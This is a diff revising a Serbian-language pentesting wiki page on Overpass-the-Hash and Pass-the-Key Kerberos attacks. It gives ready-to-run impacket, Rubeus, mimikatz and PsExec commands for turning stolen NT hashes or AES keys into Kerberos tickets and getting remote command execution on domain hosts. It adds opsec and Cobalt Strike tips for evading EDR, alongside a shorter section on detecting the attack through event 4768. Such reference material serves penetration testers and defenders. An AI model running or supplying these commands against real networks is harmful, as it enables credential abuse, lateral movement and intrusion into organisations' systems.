@@ -5,94 +5,92 @@
 
 ## Overpass The Hash/Pass The Key (PTK)
 
-**Overpass The Hash/Pass The Key (PTK)** attack je osmišljen za okruženja u kojima je tradicionalni NTLM protocol ograničen, a Kerberos authentication ima prednost. Ovaj attack koristi NTLM hash ili AES keys korisnika da zatraži Kerberos tickets, omogućavajući neovlašćen access resursima unutar networka.
+**Overpass The Hash/Pass The Key (PTK)** napad namenjen je okruženjima u kojima je tradicionalni NTLM protokol ograničen, a Kerberos autentifikacija ima prednost. Ovaj napad koristi NTLM hash ili AES ključeve korisnika za pribavljanje Kerberos tickets, čime se omogućava neovlašćen pristup resursima unutar mreže.
 
-U strogom smislu:
+Strogo govoreći:
 
-- **Over-Pass-the-Hash** obično znači pretvaranje **NT hash**-a u Kerberos TGT preko **RC4-HMAC** Kerberos key.
-- **Pass-the-Key** je opštija verzija gde već imate Kerberos key, kao što je **AES128/AES256**, i direktno tražite TGT pomoću njega.
+- **Over-Pass-the-Hash** obično znači pretvaranje **NT hash** vrednosti u Kerberos TGT putem **RC4-HMAC** Kerberos ključa.
+- **Pass-the-Key** je opštija varijanta, kod koje već posedujete Kerberos ključ, kao što je **AES128/AES256**, i direktno sa njim zahtevate TGT.
 
-Ova razlika je važna u hardened environmentima: ako je **RC4 disabled** ili više nije pretpostavljen od strane KDC-a, **sam NT hash nije dovoljan** i potreban vam je **AES key** (ili cleartext password da biste ga izveli).
+Ova razlika je važna u hardened okruženjima: ako je **RC4** onemogućen ili ga KDC više ne podrazumeva, sam **NT hash** nije dovoljan i potreban vam je **AES ključ** (ili cleartext password iz kojeg se on može izvesti).
 
-Da biste izvršili ovaj attack, početni korak uključuje pribavljanje NTLM hash-a ili passworda naloga ciljanog korisnika. Nakon obezbeđivanja ove informacije, može se dobiti Ticket Granting Ticket (TGT) za nalog, što napadaču omogućava access servisima ili mašinama za koje korisnik ima permissions.
+Da bi se ovaj napad izvršio, prvi korak je pribavljanje NTLM hash-a ili lozinke naloga ciljanog korisnika. Nakon pribavljanja ovih podataka, moguće je dobiti Ticket Granting Ticket (TGT) za taj nalog, što napadaču omogućava pristup servisima ili mašinama za koje korisnik ima dozvole.
 
-Proces se može pokrenuti sledećim komandama:
+Proces se može pokrenuti sledećim komandama:<sup>[[1]](#references)</sup>
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-Za scenarije koji zahtevaju AES256, može se koristiti opcija `-aesKey [AES key]`:
+Za scenarije koji zahtevaju AES256, može se koristiti opcija `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
 export KRB5CCNAME=velociraptor.ccache
 python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
 ```
-`getTGT.py` takođe podržava zahtev za **service ticket** direktno kroz **AS-REQ** sa `-service <SPN>`, što može biti korisno kada želiš ticket za određeni SPN bez dodatnog TGS-REQ:
+`getTGT.py` takođe podržava direktno zahtevavanje **service ticket-a putem AS-REQ** pomoću opcije `-service <SPN>`, što može biti korisno kada želite ticket za određeni SPN bez dodatnog TGS-REQ-a:
 ```bash
 python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
 ```
-Štaviše, dobijeni ticket može da se koristi sa različitim alatima, uključujući `smbexec.py` ili `wmiexec.py`, čime se širi opseg napada.
+Štaviše, pribavljeni ticket može se koristiti sa različitim alatima, uključujući `smbexec.py` ili `wmiexec.py`, čime se proširuje opseg napada.
 
-Problemi poput _PyAsn1Error_ ili _KDC cannot find the name_ se obično rešavaju ažuriranjem Impacket biblioteke ili korišćenjem hostname-a umesto IP adrese, čime se obezbeđuje kompatibilnost sa Kerberos KDC.
+Problemi kao što su _PyAsn1Error_ ili _KDC cannot find the name_ obično se rešavaju ažuriranjem biblioteke Impacket ili korišćenjem hostname-a umesto IP adrese, čime se obezbeđuje kompatibilnost sa Kerberos KDC-om.
 
-Alternativni niz komandi koristeći Rubeus.exe pokazuje još jedan aspekt ove tehnike:
+Alternativni niz komandi koji koristi Rubeus.exe prikazuje još jedan aspekt ove tehnike:<sup>[[1]](#references)</sup>
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-Ovaj metod odražava pristup **Pass the Key**, sa fokusom na preuzimanje i korišćenje tiketa direktno za potrebe autentifikacije. U praksi:
+Ovaj metod prati pristup **Pass the Key**, sa fokusom na preuzimanje i direktno korišćenje ticket-a u svrhu autentikacije. U praksi:
 
-- `Rubeus asktgt` šalje **raw Kerberos AS-REQ/AS-REP** sam po sebi i **ne treba** mu admin prava osim ako želiš da ciljaš drugi logon session sa `/luid` ili da napraviš poseban sa `/createnetonly`.
-- `mimikatz sekurlsa::pth` patchuje credential material u logon session i zato **dotiče LSASS**, što obično zahteva local admin ili `SYSTEM` i upadljivije je iz EDR perspektive.
+- `Rubeus asktgt` sam šalje **raw Kerberos AS-REQ/AS-REP** i ne zahteva admin prava, osim ako želite da ciljate drugu logon session pomoću `/luid` ili kreirate zasebnu pomoću `/createnetonly`.
+- `mimikatz sekurlsa::pth` ubacuje materijal sa kredencijalima u logon session i zbog toga **pristupa LSASS-u**, što obično zahteva local admin ili `SYSTEM` i stvara više buke iz EDR perspektive.
 
-Primeri sa Mimikatz:
+Primeri sa Mimikatz-om:
 ```bash
 sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
 sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
 ```
-Da bi se uskladilo sa operational security i koristio AES256, može se primeniti sledeća komanda:
+Radi usklađivanja sa operativnom bezbednošću i korišćenja AES256, može se primeniti sledeća komanda:
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
-`/opsec` je relevantan zato što se traffic koji generiše Rubeus malo razlikuje od nativnog Windows Kerberos. Takođe imaj na umu da je `/opsec` namenjen za **AES256** traffic; njegovo korišćenje sa RC4 obično zahteva `/force`, što u velikoj meri poništava poentu jer je **RC4 u modernim domenima sam po sebi jak signal**.
+`/opsec` je relevantan zato što se saobraćaj koji generiše Rubeus neznatno razlikuje od izvornog Windows Kerberos saobraćaja. Takođe imajte na umu da je `/opsec` namenjen saobraćaju **AES256**; njegovo korišćenje sa RC4 obično zahteva `/force`, čime se poništava veliki deo svrhe, jer je **RC4 u modernim domenima sam po sebi jak signal**.
 
-## Detection notes
+## Napomene o detekciji
 
-Svaki TGT request generiše **event `4768`** na DC-u. U aktuelnim Windows buildovima ovaj event sadrži korisnija polja nego što stariji tekstovi navode:
+Svaki zahtev za TGT generiše **događaj `4768`** na DC-u. U aktuelnim verzijama Windows-a ovaj događaj sadrži korisnija polja nego što se navodi u starijim tekstovima:
 
-- `TicketEncryptionType` pokazuje koji je enctype korišćen za izdati TGT. Tipične vrednosti su `0x17` za **RC4-HMAC**, `0x11` za **AES128**, i `0x12` za **AES256**.
-- Ažurirani eventi takođe izlažu `SessionKeyEncryptionType`, `PreAuthEncryptionType`, i advertised enctypes klijenta, što pomaže da se razlikuje **stvarna RC4 zavisnost** od zbunjujućih legacy podrazumevanih vrednosti.
-- Ako vidiš `0x17` u modernom okruženju, to je dobar trag da nalog, host, ili KDC fallback path i dalje dozvoljava RC4 i zato je pogodniji za NT-hash-based Over-Pass-the-Hash.
+- `TicketEncryptionType` pokazuje koji je enctype korišćen za izdati TGT. Tipične vrednosti su `0x17` za **RC4-HMAC**, `0x11` za **AES128** i `0x12` za **AES256**.<sup>[[3]](#references)</sup>
+- Ažurirani događaji takođe otkrivaju `SessionKeyEncryptionType`, `PreAuthEncryptionType` i enctypes koje je klijent oglasio, što pomaže u razlikovanju **stvarne zavisnosti od RC4** od zbunjujućih zastarelih podrazumevanih vrednosti.
+- Pojavljivanje `0x17` u modernom okruženju dobar je pokazatelj da nalog, host ili KDC fallback putanja i dalje dozvoljavaju RC4 i da su zato pogodniji za Over-Pass-the-Hash zasnovan na NT hash-u.
 
-Microsoft postepeno smanjuje RC4-by-default ponašanje od November 2022 Kerberos hardening updates, a trenutno objavljena preporuka je da se **ukloni RC4 kao podrazumevani pretpostavljeni enctype za AD DCs do kraja Q2 2026**. Sa ofanzivne strane, to znači da je **Pass-the-Key sa AES** sve češće pouzdan put, dok će klasični **NT-hash-only OpTH** sve češće failovati u hardenovanim okruženjima.
+Microsoft postepeno smanjuje ponašanje sa RC4 kao podrazumevanom vrednošću još od Kerberos hardening ažuriranja iz novembra 2022. godine, a aktuelne objavljene smernice nalažu da se **RC4 ukloni kao podrazumevani pretpostavljeni enctype za AD DC-ove do kraja Q2 2026. godine**. Iz ofanzivne perspektive, to znači da je **Pass-the-Key sa AES-om** sve pouzdaniji put, dok će klasični **OpTH koji koristi samo NT hash** sve češće neuspešno raditi u očvrsnutim okruženjima.<sup>[[3]](#references)</sup>
 
-Za više detalja o Kerberos encryption types i related ticketing behaviour, pogledaj:
+Za više detalja o Kerberos tipovima enkripcije i povezanim načinima ponašanja pri radu sa ticket-ima pogledajte:
 
 {{#ref}}
 kerberos-authentication.md
 {{#endref}}
 
-## Stealthier version
+## Diskretnija verzija
 
 > [!WARNING]
-> Svaka logon session može imati samo jedan aktivan TGT u isto vreme, zato budi pažljiv.
+> Svaka logon sesija može imati samo jedan aktivan TGT u datom trenutku, zato budite oprezni.
 
-1. Kreiraj novu logon session sa **`make_token`** iz Cobalt Strike.
-2. Zatim, koristi Rubeus da generiše TGT za novu logon session bez uticaja na postojeću.
+1. Kreirajte novu logon sesiju pomoću **`make_token`** iz Cobalt Strike-a.
+2. Zatim koristite Rubeus da generišete TGT za novu logon sesiju bez uticaja na postojeću.
 
-Možeš postići sličnu izolaciju i direktno iz Rubeus-a sa žrtvenom **logon type 9** session:
+Sličnu izolaciju možete postići i iz samog Rubeus-a pomoću žrtvene sesije **logon type 9**:
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
-Ovo izbegava prepisivanje trenutnog session TGT i obično je bezbednije nego importovanje tiketa u vašu postojeću logon session.
+Ovo izbegava prepisivanje trenutnog session TGT-a i obično je bezbednije nego uvoz ticket-a u postojeću logon session.
 
+## Reference
 
-## References
-
-- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
-- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
-- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
-
+- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
+- [2] [GhostPack - Rubeus (GitHub repozitorijum)](https://github.com/GhostPack/Rubeus)
+- [3] [Microsoft Learn - Otkrivanje i otklanjanje upotrebe RC4 u Kerberosu](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
 
 {{#include ../../banners/hacktricks-training.md}}
